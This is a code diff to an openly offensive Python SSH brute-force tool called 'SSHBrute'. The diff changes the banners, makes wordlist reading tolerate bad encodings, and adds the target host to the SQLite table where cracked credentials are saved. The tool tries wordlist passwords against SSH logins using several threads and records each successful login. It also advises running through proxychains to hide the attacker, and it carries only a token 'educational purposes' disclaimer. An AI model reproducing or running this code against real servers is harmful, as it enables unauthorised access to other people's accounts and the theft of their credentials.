@@ -12,6 +12,7 @@ Note: Use proxychains when executing this script to avoid errors
 #As always, happy hacking :)
 ###############################
 import paramiko
+import codecs
 import socket
 from termcolor import colored
 import optparse
@@ -25,15 +26,7 @@ class Engine:
     def __init__(self):
         #variables required:
         #hostname, username,timeout, wordlist, threads
-        print(colored("   ____      __        __","yellow"))
-        print(colored(" /_____|    |  |      |  |","yellow"))
-        print(colored("|           |  |      |  |  ","yellow"))
-        print(colored(" \___       |   \____/   |","yellow"))
-        print(colored("      \     |   /    \   |","yellow"))
-        print(colored(" ______|    |  |      |  |","yellow"))
-        print(colored("|_____/  x2 |__|      |__|  BRUTER","yellow"))
-        print(colored("SSHBrute script","blue"))
-        print(colored("Written by Romeos CyberGypsy","yellow"))
+        print(colored("       Ⓦⓡⓘⓣⓣⓔⓝ ⓑⓨ Ⓡⓞⓜⓔⓞⓢ ⒸⓨⓑⓔⓡⒼⓨⓟⓢⓨ","blue"))
         print(colored("I recommend incorporating proxy chains when using this script to avoid errors.","green"))
         print(colored("[-] For educational purposes only.\nI will not be held accountable for any misuse of the sript","red"))
         self.parser = optparse.OptionParser()
@@ -58,12 +51,12 @@ class Engine:
 
 
     def read_pass_file(self):
-        file = open(self.values.wordlist,"r")
+        file = codecs.open(self.values.wordlist,"r", encoding = 'utf-8', errors = 'ignore')
         return file
 
     def brute(self, hostname, username, threads, wordlist, timeout):
         x = 0
-        file = open(self.values.wordlist,"r")
+        file = codecs.open(self.values.wordlist,"r", encoding = 'utf-8', errors = 'ignore')
         if int(threads) > 15:
             print(colored("Number of threads should range between 1-15. Please try again!!","yellow"))
             sys.exit()
@@ -73,7 +66,7 @@ class Engine:
 
         file.close()
         y = 0
-        file = open(wordlist, "r")
+        file = codecs.open(wordlist, "r", encoding = 'utf-8', errors = 'ignore')
         for password in file.readlines():
             password = password.strip("\n")
             y+=1
@@ -95,11 +88,11 @@ class Engine:
             hostname = socket.gethostbyname(hostname)
             client.connect(hostname = hostname, username = username, password = password, timeout = int(timeout))
             print(colored("[+] Logins found. {} : {}".format(username, password), "yellow"))
-            credentials = [username, password]
+            credentials = [username, password,hostname]
             conn = lite.connect("password.db")
             cur = conn.cursor()
-            cur.execute('create table if not exists credentials(Username TEXT, Password TEXT)')
-            cur.execute("INSERT INTO credentials VALUES(?,?)",credentials)
+            cur.execute('create table if not exists credentials(Username TEXT, Password TEXT, Host TEXT)')
+            cur.execute("INSERT INTO credentials VALUES(?,?,?)",credentials)
             conn.commit()
             conn.close()
             messagebox.showinfo("Info:","Credentials found:\nUsername:{}\nPassword:{}".format(username, password))
@@ -123,4 +116,9 @@ class Engine:
 
 
 if __name__ == '__main__':
+    banner = '''
+    ░█▀▀░█▀▀░█░█░░░█▀▄░█▀▄░█░█░▀█▀░█▀▀
+    ░▀▀█░▀▀█░█▀█░░░█▀▄░█▀▄░█░█░░█░░█▀▀
+    ░▀▀▀░▀▀▀░▀░▀░░░▀▀░░▀░▀░▀▀▀░░▀░░▀▀▀'''
+    print(colored(banner,"green"))
     obj = Engine()
